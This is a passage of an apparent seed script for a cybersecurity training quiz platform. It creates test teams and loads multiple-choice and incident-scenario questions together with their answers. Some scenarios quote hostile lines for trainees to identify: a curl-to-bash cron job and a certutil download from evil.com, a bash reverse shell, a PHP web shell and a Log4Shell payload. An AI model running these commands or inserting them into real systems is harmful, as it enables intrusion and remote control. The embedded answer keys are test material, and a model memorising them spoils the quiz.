const { run, get, all } = require('./models/database');
const bcrypt = require('bcryptjs');

async function createTestTeams() {
  console.log('Creating test teams...');
  const teams = [
    { name: 'Team Alpha', members: ['alpha_m1', 'alpha_m2', 'alpha_m3', 'alpha_m4', 'alpha_m5'] },
    { name: 'Team Beta', members: ['beta_m1', 'beta_m2', 'beta_m3', 'beta_m4', 'beta_m5'] },
    { name: 'Team Gamma', members: ['gamma_m1', 'gamma_m2', 'gamma_m3', 'gamma_m4', 'gamma_m5'] }
  ];
  const password = await bcrypt.hash('pass123', 10);

  for (const team of teams) {
    const existing = await get('SELECT id FROM teams WHERE team_name = ?', [team.name]);
    if (existing) { console.log(`  Team ${team.name} already exists`); continue; }
    const teamCode = 'TEAM-' + Math.random().toString(36).substring(2, 8).toUpperCase();
    const teamResult = await run('INSERT INTO teams (team_name, team_code) VALUES (?, ?)', [team.name, teamCode]);
    const teamId = teamResult.lastID;
    for (let i = 0; i < 5; i++) {
      const memberNumber = i + 1;
      const userResult = await run(
        `INSERT INTO users (username, password, role, team_name, team_id, member_number) VALUES (?, ?, 'player', ?, ?, ?)`,
        [team.members[i], password, team.name, teamId, memberNumber]
      );
      await run(`INSERT INTO team_members (team_id, user_id, member_number) VALUES (?, ?, ?)`, [teamId, userResult.lastID, memberNumber]);
    }
    console.log(`  Created ${team.name} with 5 members`);
  }
}

const mcEasy = [
  { t: 'What is HTTPS used for?', d: 'Which protocol is used to securely browse websites?\n\nA) HTTP\nB) FTP\nC) HTTPS\nD) SMTP', a: 'C', p: 100 },
  { t: 'Firewall Purpose', d: 'What does a firewall primarily do?\n\nA) Scan for viruses\nB) Block unauthorized network access\nC) Encrypt emails\nD) Manage passwords', a: 'B', p: 100 },
  { t: 'Packet Capture Tool', d: 'Which tool is commonly used to capture and analyze network packets?\n\nA) Photoshop\nB) Wireshark\nC) Excel\nD) Notepad', a: 'B', p: 100 },
  { t: 'Strong Password', d: 'Which of these is the strongest password?\n\nA) password123\nB) admin\nC) P@ssw0rd!2024\nD) qwerty', a: 'C', p: 100 },
  { t: 'VPN Meaning', d: 'What does VPN stand for?\n\nA) Virtual Private Network\nB) Very Personal Network\nC) Visual Protected Node\nD) Virtual Public Node', a: 'A', p: 100 },
  { t: 'HTTP Port', d: 'Which port is used by standard HTTP traffic?\n\nA) 22\nB) 80\nC) 443\nD) 3389', a: 'B', p: 100 },
  { t: 'HTTPS Port', d: 'Which port is used by HTTPS traffic?\n\nA) 80\nB) 443\nC) 22\nD) 8080', a: 'B', p: 100 },
  { t: 'Antivirus Purpose', d: 'What is the primary purpose of antivirus software?\n\nA) Speed up the computer\nB) Detect and remove malware\nC) Manage network traffic\nD) Backup files', a: 'B', p: 100 },
  { t: 'Phishing Definition', d: 'What is phishing in cybersecurity?\n\nA) A type of firewall\nB) A social engineering attack to steal credentials\nC) A network protocol\nD) An encryption method', a: 'B', p: 100 },
  { t: 'Ping Command', d: 'Which command checks network connectivity to a remote host?\n\nA) ping\nB) ls\nC) cd\nD) cat', a: 'A', p: 100 },
  { t: 'Two-Factor Auth', d: 'What is two-factor authentication (2FA)?\n\nA) Using two passwords\nB) Using two different usernames\nC) A second security layer beyond the password\nD) Logging in twice', a: 'C', p: 100 },
  { t: 'Safe Browsing', d: 'Which of these is a safe browsing practice?\n\nA) Click all pop-up ads\nB) Use the same password everywhere\nC) Check for HTTPS and the padlock icon\nD) Download files from unknown sources', a: 'C', p: 100 },
  { t: 'Ransomware Definition', d: 'What is ransomware?\n\nA) Software that speeds up the computer\nB) Malware that encrypts files and demands payment\nC) A type of firewall\nD) A network monitoring tool', a: 'B', p: 100 },
  { t: 'Netstat Command', d: 'Which command displays active network connections on Linux?\n\nA) ls\nB) netstat\nC) echo\nD) pwd', a: 'B', p: 100 },
  { t: 'DDoS Attack', d: 'What is a DDoS attack?\n\nA) A virus that deletes files\nB) Overwhelming a server with traffic to make it unavailable\nC) Stealing passwords through fake websites\nD) Encrypting data for ransom', a: 'B', p: 100 },
  { t: 'Trojan Definition', d: 'Which is an example of a Trojan horse malware?\n\nA) Windows Update\nB) Google Chrome\nC) Fake antivirus that steals data\nD) Microsoft Word', a: 'C', p: 100 },
  { t: 'Brute Force Attack', d: 'What is a brute force attack?\n\nA) Using physical force on a computer\nB) Trying many passwords to guess the correct one\nC) Sending fake emails\nD) Exploiting a software vulnerability', a: 'B', p: 100 },
  { t: 'Password Manager', d: 'Which of these is a secure way to store passwords?\n\nA) In a text file on the desktop\nB) Using a password manager\nC) Written on a sticky note\nD) In an email draft', a: 'B', p: 100 },
  { t: 'HTTPS Meaning', d: 'What does the "S" in HTTPS stand for?\n\nA) Speed\nB) Secure\nC) Simple\nD) Standard', a: 'B', p: 100 },
  { t: 'Least Privilege', d: 'What is the principle of least privilege?\n\nA) Give everyone admin access\nB) Give users only the permissions they need\nC) No one can access anything\nD) Only the CEO has access', a: 'B', p: 100 },
  { t: 'Social Engineering', d: 'What is social engineering in cybersecurity?\n\nA) Building social networks\nB) Manipulating people to reveal confidential information\nC) Engineering social media platforms\nD) Creating social events', a: 'B', p: 100 },
  { t: 'Auth Log Location', d: 'Which log file tracks authentication attempts on Linux?\n\nA) /var/log/syslog\nB) /var/log/auth.log\nC) /var/log/kern.log\nD) /var/log/boot.log', a: 'B', p: 100 },
  { t: 'Zero-Day Vulnerability', d: 'What is a zero-day vulnerability?\n\nA) A bug fixed on day zero\nB) A vulnerability unknown to the vendor without a patch\nC) A vulnerability that appears on day one\nD) A harmless software glitch', a: 'B', p: 100 },
  { t: 'Encryption Purpose', d: 'What is the main purpose of encryption?\n\nA) Make data larger\nB) Protect data confidentiality by encoding it\nC) Delete unnecessary files\nD) Speed up data transfer', a: 'B', p: 100 },
  { t: 'Password Policy', d: 'Which is a strong password policy requirement?\n\nA) At least 8 characters with mixed case, numbers, and symbols\nB) Only lowercase letters\nC) Minimum 4 characters\nD) Using your birth date', a: 'A', p: 100 },
  { t: 'IDS Function', d: 'What is the function of an Intrusion Detection System?\n\nA) Block all traffic\nB) Detect suspicious activity\nC) Encrypt data\nD) Manage user accounts', a: 'B', p: 100 },
  { t: 'Ps Command', d: 'Which Linux command lists running processes?\n\nA) ls\nB) ps\nC) cd\nD) rm', a: 'B', p: 100 },
  { t: 'SQL Injection', d: 'What is SQL injection?\n\nA) Injecting SQL software into a database\nB) Inserting malicious SQL queries through input fields\nC) Updating SQL server software\nD) Creating SQL databases', a: 'B', p: 100 },
  { t: 'Auth.log Location', d: 'Where are SSH login attempts logged on Linux?\n\nA) /var/log/messages\nB) /var/log/secure\nC) /var/log/auth.log\nD) /var/log/httpd', a: 'C', p: 100 },
  { t: 'Malware Types', d: 'Which malware type replicates itself without needing a host file?\n\nA) Virus\nB) Worm\nC) Trojan\nD) Ransomware', a: 'B', p: 100 },
];

const mcMedium = [
  { t: 'HTTP Status Code', d: 'Which HTTP status code indicates a successful request?\n\nA) 301\nB) 404\nC) 200\nD) 500', a: 'C', p: 150 },
  { t: 'SIEM Purpose', d: 'What is the primary purpose of a SIEM system?\n\nA) Encrypt network traffic\nB) Aggregate and analyze security logs from multiple sources\nC) Block all inbound traffic\nD) Manage user passwords', a: 'B', p: 150 },
  { t: 'XSS Definition', d: 'What does XSS stand for in web security?\n\nA) XML Secure Sockets\nB) Cross-Site Scripting\nC) Extra Secure System\nD) Xtra Security Solution', a: 'B', p: 150 },
  { t: 'Symmetric Algorithm', d: 'Which cryptographic algorithm is considered symmetric?\n\nA) RSA\nB) AES\nC) SHA-256\nD) DSA', a: 'B', p: 150 },
  { t: 'IDS vs IPS', d: 'What is the difference between IDS and IPS?\n\nA) IDS detects, IPS prevents\nB) IPS detects, IDS prevents\nC) They are the same thing\nD) IDS only works on wireless networks', a: 'A', p: 150 },
  { t: 'TCP Handshake', d: 'Which TCP flag is set during the first step of a three-way handshake?\n\nA) ACK\nB) FIN\nC) SYN\nD) RST', a: 'C', p: 150 },
  { t: 'Reverse Proxy', d: 'What is the purpose of a reverse proxy?\n\nA) Connect to the internet\nB) Forward external requests to internal servers while hiding them\nC) Perform reverse DNS lookups\nD) Encrypt all outbound traffic', a: 'B', p: 150 },
  { t: 'Vulnerability Scanner', d: 'Which tool is specifically designed for vulnerability scanning?\n\nA) Wireshark\nB) Nmap\nC) Nessus\nD) tcpdump', a: 'C', p: 150 },
  { t: 'OWASP Top 10', d: 'What does the OWASP Top 10 represent?\n\nA) Top 10 best firewalls\nB) Top 10 web application security risks\nC) Top 10 encryption algorithms\nD) Top 10 programming languages', a: 'B', p: 150 },
  { t: 'Worm Behavior', d: 'Which type of malware spreads without any user interaction?\n\nA) Trojan\nB) Worm\nC) Ransomware\nD) Spyware', a: 'B', p: 150 },
  { t: 'Penetration Test', d: 'What is the main purpose of a penetration test?\n\nA) Test network speed\nB) Identify vulnerabilities by simulating attacks\nC) Install security software\nD) Train employees', a: 'B', p: 150 },
  { t: 'MITM Attack', d: 'What is a man-in-the-middle attack?\n\nA) Physically attacking a server\nB) Intercepting communication between two parties\nC) Hacking into a mainframe\nD) Using a proxy server', a: 'B', p: 150 },
  { t: 'Passwd File', d: 'Which Linux file contains user account information?\n\nA) /etc/hosts\nB) /etc/passwd\nC) /etc/resolv.conf\nD) /etc/profile', a: 'B', p: 150 },
  { t: 'CSRF Definition', d: 'What does CSRF stand for?\n\nA) Cross-Site Request Forgery\nB) Cross-Site Resource Framework\nC) Client-Side Request Forwarding\nD) Cybersecurity Risk Framework', a: 'A', p: 150 },
  { t: 'DNS Port', d: 'Which port does DNS typically use?\n\nA) 25\nB) 53\nC) 110\nD) 143', a: 'B', p: 150 },
  { t: 'Honeypot', d: 'What is a honeypot in cybersecurity?\n\nA) A sweet snack for hackers\nB) A decoy system to attract and trap attackers\nC) A type of firewall\nD) An encryption method', a: 'B', p: 150 },
  { t: 'WPA2 Security', d: 'Which encryption protocol secures most modern Wi-Fi networks?\n\nA) WEP\nB) WPA2\nC) Bluetooth\nD) SSL', a: 'B', p: 150 },
  { t: 'Chmod Purpose', d: 'What does the chmod command do in Linux?\n\nA) Change file ownership\nB) Change file permissions\nC) Create a new directory\nD) Check disk space', a: 'B', p: 150 },
  { t: 'Certificate Authority', d: 'Which of these is a component of Public Key Infrastructure?\n\nA) Certificate Authority\nB) Password Manager\nC) Firewall Rule\nD) Antivirus Database', a: 'A', p: 150 },
  { t: 'IOC Definition', d: 'What is an Indicator of Compromise (IOC)?\n\nA) A security policy document\nB) Artifacts that indicate a system breach\nC) A type of firewall\nD) A user login credential', a: 'B', p: 150 },
  { t: 'Smishing Attack', d: 'Which attack uses fraudulent SMS messages?\n\nA) Phishing\nB) Vishing\nC) Smishing\nD) Whaling', a: 'C', p: 150 },
  { t: 'Rootkit Function', d: 'What does a rootkit do?\n\nA) Improve system performance\nB) Hide malicious activity from the operating system\nC) Encrypt files\nD) Manage network connections', a: 'B', p: 150 },
  { t: 'SSH Port', d: 'Which port does SSH use by default?\n\nA) 23\nB) 22\nC) 21\nD) 25', a: 'B', p: 150 },
  { t: 'Black Box Testing', d: 'What is the difference between black-box and white-box testing?\n\nA) Black-box is automated, white-box is manual\nB) Black-box has no prior knowledge, white-box has full knowledge\nC) Black-box tests security, white-box tests functionality\nD) There is no difference', a: 'B', p: 150 },
  { t: 'Replay Attack', d: 'What is a replay attack in cybersecurity?\n\nA) Re-recording and retransmitting valid data transmissions\nB) Replaying a video of a cyber attack\nC) Repeatedly guessing passwords\nD) Restarting the network', a: 'A', p: 150 },
  { t: 'Route Command', d: 'Which command shows the IP routing table on Linux?\n\nA) ifconfig\nB) route -n\nC) ps aux\nD) df -h', a: 'B', p: 150 },
  { t: 'Drive-by Download', d: 'Which attack exploits unpatched software vulnerabilities automatically?\n\nA) Phishing\nB) Drive-by download\nC) Social engineering\nD) Brute force', a: 'B', p: 150 },
  { t: 'WAF Purpose', d: 'What is the purpose of a Web Application Firewall (WAF)?\n\nA) Block all web traffic\nB) Filter and monitor HTTP traffic to protect web apps\nC) Encrypt website content\nD) Manage web server logs', a: 'B', p: 150 },
  { t: 'Secure Hash', d: 'Which cryptographic hash algorithm is considered currently secure?\n\nA) MD5\nB) SHA-256\nC) SHA-1\nD) CRC32', a: 'B', p: 150 },
  { t: 'Listening Ports', d: 'What does the netstat -tulpn command show on Linux?\n\nA) The routing table\nB) Listening ports and their associated processes\nC) The DNS cache\nD) Network interfaces', a: 'B', p: 150 },
  { t: 'LDAPS Protocol', d: 'Which protocol is used for encrypted directory services?\n\nA) LDAP\nB) LDAPS\nC) HTTP\nD) FTP', a: 'B', p: 150 },
  { t: 'Windows Event Log', d: 'Which Windows Event ID indicates a successful logon?\n\nA) 4624\nB) 4625\nC) 4634\nD) 4647', a: 'A', p: 150 },
  { t: 'Syslog Facility', d: 'Which syslog facility code is typically used for security-related messages?\n\nA) kern (0)\nB) auth (4)\nC) mail (2)\nD) local0 (16)', a: 'B', p: 150 },
  { t: 'ICMP Flood', d: 'What type of DDoS attack uses ICMP echo requests?\n\nA) SYN flood\nB) Ping flood / Smurf attack\nC) HTTP flood\nD) DNS amplification', a: 'B', p: 150 },
  { t: 'Data at Rest', d: 'Which encryption protects data stored on a hard drive?\n\nA) TLS\nB) AES\nC) HTTPS\nD) SSL', a: 'B', p: 150 },
  { t: 'Incident Response Step', d: 'In the NIST incident response framework, what step follows "Detection & Analysis"?\n\nA) Preparation\nB) Containment, Eradication & Recovery\nC) Post-Incident Activity\nD) Notification', a: 'B', p: 150 },
];

const mcHard = [
  { t: 'PKI Revocation', d: 'In PKI, what does a Certificate Revocation List (CRL) contain?\n\nA) All issued certificates\nB) Certificates revoked before expiration\nC) Expired certificates only\nD) Certificate signing requests', a: 'B', p: 200 },
  { t: 'SQL Injection Attack', d: 'Which attack exploits unsanitized input in database queries?\n\nA) XSS\nB) CSRF\nC) SQL Injection\nD) Buffer Overflow', a: 'C', p: 200 },
  { t: 'Race Condition', d: 'What is a race condition vulnerability?\n\nA) Two processes racing to finish first\nB) A timing-based flaw where operations can be exploited\nC) A type of DoS attack\nD) Competition between security tools', a: 'B', p: 200 },
  { t: 'Kernel Exploit', d: 'Which technique allows breaking out of a sandbox environment?\n\nA) Privilege escalation via kernel exploit\nB) SQL injection\nC) Cross-site scripting\nD) DNS poisoning', a: 'A', p: 200 },
  { t: 'ASLR Purpose', d: 'What is the purpose of Address Space Layout Randomization (ASLR)?\n\nA) Encrypt memory contents\nB) Randomize memory addresses to prevent exploits\nC) Allocate more RAM\nD) Scan memory for viruses', a: 'B', p: 200 },
  { t: 'Post-Exploitation', d: 'Which of these is a post-exploitation framework?\n\nA) Nmap\nB) Metasploit\nC) Wireshark\nD) Nikto', a: 'B', p: 200 },
  { t: 'Symmetric vs Asymmetric', d: 'What is the key difference between symmetric and asymmetric encryption?\n\nA) Symmetric is faster and uses one key; asymmetric uses two keys\nB) Symmetric uses two keys, asymmetric uses one\nC) Symmetric only encrypts, asymmetric only decrypts\nD) No practical difference', a: 'A', p: 200 },
  { t: 'Digital Forensics', d: 'What is the purpose of chain of custody in digital forensics?\n\nA) To physically chain evidence\nB) To document evidence handling from collection to court\nC) To chain multiple computers together\nD) To encrypt forensic data', a: 'B', p: 200 },
  { t: 'Pass-the-Hash', d: 'What is a pass-the-hash attack?\n\nA) Stealing plaintext passwords\nB) Using NTLM hashes to authenticate without knowing the password\nC) Hashing passwords with a different algorithm\nD) Cracking password hashes offline', a: 'B', p: 200 },
  { t: 'ARP Spoofing', d: 'Which protocol is vulnerable to spoofing attacks on local networks?\n\nA) TCP\nB) UDP\nC) ARP\nD) ICMP', a: 'C', p: 200 },
  { t: 'DLL Hijacking', d: 'What is DLL hijacking?\n\nA) Deleting system DLLs\nB) Loading a malicious DLL in place of a legitimate one\nC) Encrypting DLL files\nD) Creating new DLL files', a: 'B', p: 200 },
  { t: 'TOCTOU', d: 'What is a TOCTOU vulnerability?\n\nA) Time-of-check to time-of-use race condition\nB) A type of cross-site scripting\nC) A network protocol flaw\nD) An encryption weakness', a: 'A', p: 200 },
  { t: 'Kerberos Purpose', d: 'What is Kerberos primarily used for?\n\nA) Encrypting files\nB) Authentication in network environments\nC) Scanning network ports\nD) Managing firewalls', a: 'B', p: 200 },
  { t: 'DEP Protection', d: 'What is the purpose of Data Execution Prevention (DEP)?\n\nA) Delete protected files\nB) Prevent code execution from non-executable memory\nC) Encrypt data in transit\nD) Protect against phishing', a: 'B', p: 200 },
  { t: 'MFT Forensics', d: 'Which file system artifact tracks files on NTFS volumes?\n\nA) Registry\nB) $MFT (Master File Table)\nC) Event Log\nD) Prefetch', a: 'B', p: 200 },
  { t: 'Golden Ticket', d: 'What is a Golden Ticket attack in Active Directory?\n\nA) An award for best security practice\nB) Forging Kerberos TGT for domain admin access\nC) A type of phishing email\nD) A DDoS attack tool', a: 'B', p: 200 },
  { t: 'LOLBin Abuse', d: 'Which is a commonly abused Living-off-the-Land binary?\n\nA) notepad.exe\nB) powershell.exe\nC) mspaint.exe\nD) explorer.exe', a: 'B', p: 200 },
  { t: 'SIEM vs SOAR', d: 'What is the key difference between SIEM and SOAR?\n\nA) SIEM detects, SOAR automates incident response\nB) SOAR detects, SIEM responds\nC) They are identical products\nD) SIEM is open source', a: 'A', p: 200 },
  { t: 'Supply Chain Attack', d: 'What is a supply chain attack?\n\nA) Attacking a physical supply store\nB) Compromising a vendor to infect their customers\nC) Stealing physical supplies\nD) Intercepting shipping containers', a: 'B', p: 200 },
  { t: 'Cloud Security Model', d: 'In cloud security, what does "shared responsibility" mean?\n\nA) The cloud provider handles everything\nB) Security is split between provider and customer\nC) The customer handles everything\nD) Security is not needed in the cloud', a: 'B', p: 200 },
  { t: 'Memory Forensics Tool', d: 'Which tool is specialized for memory forensics?\n\nA) Nmap\nB) Volatility\nC) Wireshark\nD) Burp Suite', a: 'B', p: 200 },
  { t: 'SUID Enumeration', d: 'What does the Linux command `find / -perm -4000` do?\n\nA) Find files larger than 4000KB\nB) Find files with the SUID bit set\nC) Find files modified in the last 4000 minutes\nD) Find empty directories', a: 'B', p: 200 },
  { t: 'TLS Attack', d: 'Which of these is an attack against the TLS/SSL protocol?\n\nA) SYN flood\nB) DROWN attack\nC) Ping of death\nD) Smurf attack', a: 'B', p: 200 },
  { t: 'APT Definition', d: 'What is an Advanced Persistent Threat (APT)?\n\nA) A simple virus\nB) A sophisticated, long-term attack by well-resourced adversaries\nC) A type of firewall\nD) An automated scanning tool', a: 'B', p: 200 },
  { t: 'NIST Framework', d: 'Which NIST publication provides the standard for incident response?\n\nA) NIST SP 800-53\nB) NIST SP 800-61\nC) NIST SP 800-171\nD) NIST SP 800-37', a: 'B', p: 200 },
  { t: 'EternalBlue Exploit', d: 'Which SMB vulnerability was used by WannaCry ransomware?\n\nA) CVE-2017-0144 (EternalBlue)\nB) CVE-2014-6271 (Shellshock)\nC) CVE-2017-5638 (Struts2)\nD) CVE-2021-44228 (Log4Shell)', a: 'A', p: 200 },
  { t: 'Mimikatz Tool', d: 'What is Mimikatz primarily used for?\n\nA) Network scanning\nB) Extracting credentials from Windows memory\nC) Web vulnerability scanning\nD) Packet analysis', a: 'B', p: 200 },
  { t: 'Sysmon Tool', d: 'What is Sysmon (System Monitor) used for in incident response?\n\nA) System performance monitoring\nB) Detailed logging of process creation, network connections, and file changes\nC) Antivirus protection\nD) Firewall management', a: 'B', p: 200 },
  { t: 'YARA Purpose', d: 'What is YARA used for in malware analysis?\n\nA) Network traffic analysis\nB) Identifying and classifying malware samples based on patterns\nC) Port scanning\nD) Password cracking', a: 'B', p: 200 },
  { t: 'Container Security', d: 'In Docker security, what is the risk of running with --privileged flag?\n\nA) Faster container startup\nB) Container can access all host devices and capabilities\nC) Better network performance\nD) Automatic container updates', a: 'B', p: 200 },
];

const techEasy = [
  { t: 'Brute Force Detection', d: 'An administrator checks /var/log/auth.log and finds 500 failed SSH login attempts from 10.0.0.50 in the last hour, followed by one successful login as root. What type of attack occurred?', a: 'BruteForce', p: 250 },
  { t: 'Crypto Miner', d: 'A server monitoring alert shows CPU at 98%. Running `ps aux` reveals a process named `xmrig` running from /tmp/.cache. What is this process?', a: 'CryptoMiner', p: 250 },
  { t: 'Open RDP Port', d: 'A security scan shows port 3389 is open on a Windows server. What service is exposed on this port?', a: 'RDP', p: 250 },
  { t: 'Default Credentials', d: 'A MySQL database is accessible with username "root" and an empty password. What is this security weakness called?', a: 'DefaultCredentials', p: 250 },
  { t: 'Cron Persistence', d: 'On a compromised Linux system, you find this cron job: `*/5 * * * * curl http://evil.com/shell.sh | bash`. What is the purpose?', a: 'Persistence', p: 250 },
  { t: 'Overly Permissive Firewall', d: 'A firewall rule allows ALL traffic from 0.0.0.0/0 to port 22 (SSH). What is the risk?', a: 'OverlyPermissive', p: 250 },
  { t: 'Data Exfiltration', d: 'Network logs show large SMB file transfers from a workstation to an external IP at 3:00 AM. What is the concern?', a: 'DataExfiltration', p: 250 },
  { t: 'SUID Risk', d: 'A file `/usr/bin/python3` has permissions `-rwsr-xr-x` and is owned by root. What privilege escalation risk exists?', a: 'SUIDMisconfiguration', p: 250 },
  { t: 'Malware Download', d: 'A user\'s browser history shows visits to `http://evil.com/download.exe` followed by system instability. What likely happened?', a: 'MalwareDownload', p: 250 },
  { t: 'Password Spray', d: 'Auth logs show rapid login attempts with usernames: admin, root, administrator, admin1, admin2, all using the password "Welcome1". What attack?', a: 'PasswordSpray', p: 250 },
  { t: 'C2 Beacon', d: 'A workstation sends periodic 1KB HTTPS packets to 203.0.113.99 every 60 seconds, 24/7. What does this pattern suggest?', a: 'C2Communication', p: 250 },
  { t: 'Phishing Email', d: 'An email claims to be from the CEO asking for an urgent wire transfer. The reply-to address is different from the sender. What attack?', a: 'CEO Fraud', p: 250 },
  { t: 'Unusual Process', d: 'Task Manager shows a process named `scvhost.exe` (note the typo) running from C:\\Users\\Public\\. What is this?', a: 'ProcessMasquerading', p: 250 },
  { t: 'USB Autorun', d: 'A USB drive contains a file named `invoice.pdf.exe` that auto-executes when plugged in. What technique is this?', a: 'USBMalware', p: 250 },
  { t: 'Excessive Privileges', d: 'A helpdesk employee has Domain Admin rights. What security principle is violated?', a: 'LeastPrivilege', p: 250 },
  { t: 'Outdated Software', d: 'A server runs Apache HTTP Server version 2.2.15 from 2010. What is the primary concern?', a: 'UnpatchedSoftware', p: 250 },
];

const techMedium = [
  { t: 'Reverse Shell', d: 'A netstat shows: `10.0.1.15:45678 -> 198.51.100.20:4444 ESTABLISHED`. PID 1820 runs `/bin/bash -i >& /dev/tcp/198.51.100.20/4444 0>&1`. What is this?', a: 'ReverseShell', p: 300 },
  { t: 'Macro Malware', d: 'A user received `invoice.docm`. When opened, it spawned `powershell.exe -EncodedCommand <base64>`. What technique was used?', a: 'MacroMalware', p: 300 },
  { t: 'Scheduled Task Backdoor', d: 'A Windows task named "WindowsUpdate" runs `certutil -urlcache -f http://evil.com/update.ps1 C:\\temp\\u.ps1 && powershell -exec bypass C:\\temp\\u.ps1`. What is this?', a: 'PersistenceMechanism', p: 300 },
  { t: 'DNS Tunneling', d: 'Network logs show DNS queries to `abc123.evil.com`, `def456.evil.com`, `ghi789.evil.com` from one internal IP. What technique?', a: 'DNS Tunneling', p: 300 },
  { t: 'SUID Privilege Escalation', d: 'The file `/usr/bin/python3` is owned by root with the SUID bit set. A standard user can run it. How can this be exploited?', a: 'SUIDEscalation', p: 300 },
  { t: 'Web Shell', d: 'A file at `/uploads/cmd.php` contains `<?php system($_GET["cmd"]); ?>`. What type of backdoor?', a: 'WebShell', p: 300 },
  { t: 'Lateral Movement', d: 'Event log shows admin user authenticating from WORKSTATION-5 to SERVER-DB over SMB, followed by service creation on SERVER-DB. What technique?', a: 'LateralMovement', p: 300 },
  { t: 'Registry Run Key', d: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run contains "Updater" pointing to C:\\Users\\Public\\updater.exe. What is this?', a: 'RegistryRunKey', p: 300 },
  { t: 'Port Scanning', d: 'Firewall logs show inbound connections from 192.168.1.200 to ports 1-1024 of a server in rapid succession. What is happening?', a: 'PortScan', p: 300 },
  { t: 'SSH Backdoor', d: 'The file `/home/admin/.ssh/authorized_keys` contains a public key that does not match any known admin. What does this mean?', a: 'SSHBackdoor', p: 300 },
  { t: 'Log Tampering', d: 'Log files show a 3-hour gap during the time of a known breach, while all other days have continuous entries. What likely happened?', a: 'LogTampering', p: 300 },
  { t: 'ADS Hiding', d: 'Running `dir /R` reveals `report.pdf` has an associated stream `report.pdf:payload.exe`. What hiding technique?', a: 'ADS-Hiding', p: 300 },
  { t: 'DLL Hijacking', d: 'A legitimate Windows executable tries to load `version.dll` from its own folder. A malicious version.dll exists there. What is this?', a: 'DLLHijacking', p: 300 },
  { t: 'Kerberoasting', d: 'A domain user account has a Service Principal Name (SPN) set and a weak password. What attack is possible?', a: 'Kerberoasting', p: 300 },
  { t: 'Named Pipe', d: 'You discover a named pipe `\\.\\pipe\\c2_channel` on a compromised system. What is a named pipe used for in malware?', a: 'IPCChannel', p: 300 },
  { t: 'AppLocker Bypass', d: 'An attacker executes code using `installutil.exe` (a Microsoft signed binary) to bypass AppLocker. What technique?', a: 'LOLBins', p: 300 },
  { t: 'WMI Persistence', d: 'A WMI binding exists between __EventFilter and __FilterToConsumerBinding that runs a PowerShell script on system startup. What technique?', a: 'WMI-Persistence', p: 300 },
  { t: 'Bootkit', d: 'A deep scan reveals a modified Master Boot Record that loads malware before the OS boots. What type?', a: 'Bootkit', p: 300 },
  { t: 'Memory Only', d: 'No malicious files on disk, but processes show injected code and anomalous network connections. What type of malware?', a: 'FilelessMalware', p: 300 },
  { t: 'LSASS Dump', d: 'A tool accesses lsass.exe process memory and extracts credentials. What tool is typically used?', a: 'Mimikatz', p: 300 },
];

const techHard = [
  { t: 'Full Attack Chain', d: 'Analysis reveals: 1) Phishing with CVE-2023 exploit -> 2) Cobalt Strike beacon -> 3) Process hollowing -> 4) LSASS dump -> 5) PsExec to DC. What is the final goal?', a: 'DomainCompromise', p: 400 },
  { t: 'Kernel Rootkit', d: 'A process appears in Task Manager but Process Explorer shows it differently. Registry reads are intercepted. What is present?', a: 'KernelRootkit', p: 400 },
  { t: 'DNS Exfiltration', d: 'A server sends DNS queries with base64-encoded subdomains to yourdomain.evil.com. What exfiltration technique?', a: 'DNSExfiltration', p: 400 },
  { t: 'MITRE ATT&CK', d: 'T1566 (Phishing) -> T1059 (Scripting) -> T1003 (Credential Dumping) -> T1021 (Remote Services). What framework is this?', a: 'MITRE ATT&CK', p: 400 },
  { t: 'Anti-Sandbox', d: 'Malware checks: 128MB RAM, VMware NIC, debugger attached. All true -> malware sleeps. What evasion technique?', a: 'AntiSandbox', p: 400 },
  { t: 'Chain of Custody', d: 'A hard drive was collected but nobody documented who accessed it between collection and analysis. What principle is broken?', a: 'ChainOfCustody', p: 400 },
  { t: 'Image Steganography', d: 'An image innocent.jpg (15MB for 1920x1080) contains hidden ZIP data. What hiding technique?', a: 'ImageSteganography', p: 400 },
  { t: 'AD Privilege Escalation', d: 'A standard user runs BloodHound and finds a path to Domain Admin via nested group memberships. What attack?', a: 'ADPrivEsc', p: 400 },
  { t: 'Container Escape', d: 'A Docker container with --privileged flag mounts the host filesystem. What vulnerability?', a: 'ContainerEscape', p: 400 },
  { t: 'IDOR Vulnerability', d: 'API logs show GET /api/v1/users/1, /api/v1/users/2, /api/v1/users/3 returning other users\' data. What vulnerability?', a: 'IDOR', p: 400 },
  { t: 'Log4Shell Exploit', d: 'An attacker sends `${jndi:ldap://evil.com/a}` in a User-Agent header. What vulnerability is being exploited?', a: 'Log4Shell', p: 400 },
  { t: 'Ransomware Response', d: 'A critical server is encrypting files and displaying a Bitcoin ransom note. What is the first containment step?', a: 'IsolateHost', p: 400 },
  { t: 'Dwell Time', d: 'Timeline: 01:00 phishing -> 01:05 macro runs -> 01:07 beacon -> 01:15 LSASS dump -> 01:30 lateral movement. Dwell time before lateral movement?', a: '25Minutes', p: 400 },
  { t: 'Threat Hunting', d: 'Searching for processes started with `-enc` or `-EncodedCommand` flags. What technique is this hunting for?', a: 'PowerShellAbuse', p: 400 },
  { t: 'Registry Forensics', d: 'Which registry key tracks recently executed programs on Windows?\nA) NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\nB) Same key but named UserAssist\nC) Same key but named TypedPaths\nD) Same key but named AppCompatFlags', a: 'A', p: 400, isMc: true },
];

async function createTestChallenges() {
  console.log('Creating test challenges...');
  const existing = await get('SELECT COUNT(*) as count FROM challenges');
  if (existing.count > 100) {
    console.log('  Challenges already exist, skipping...');
    return;
  }

  let cid = 1000;

  function makeHintObj(arr) {
    return arr.map((label, i) => ({ value: String.fromCharCode(65 + i), label }));
  }

  // MC questions
  for (const q of mcEasy) {
    const lines = q.d.split('\n').filter(l => l.match(/^[A-D]\)/));
    await run(`INSERT INTO challenges (id, type, title, description, points, category, answer, hints, difficulty, phase_number, is_active) VALUES (?, 'multiple_choice', ?, ?, ?, 'Security Fundamentals', ?, ?, 'easy', 1, 1)`,
      [cid++, q.t, q.d, q.p, q.a, JSON.stringify(makeHintObj(lines.map(l => l.replace(/^[A-D]\) /, ''))))]);
  }
  for (const q of mcMedium) {
    const lines = q.d.split('\n').filter(l => l.match(/^[A-D]\)/));
    await run(`INSERT INTO challenges (id, type, title, description, points, category, answer, hints, difficulty, phase_number, is_active) VALUES (?, 'multiple_choice', ?, ?, ?, 'Security Fundamentals', ?, ?, 'medium', 1, 1)`,
      [cid++, q.t, q.d, q.p, q.a, JSON.stringify(makeHintObj(lines.map(l => l.replace(/^[A-D]\) /, ''))))]);
  }
  for (const q of mcHard) {
    const lines = q.d.split('\n').filter(l => l.match(/^[A-D]\)/));
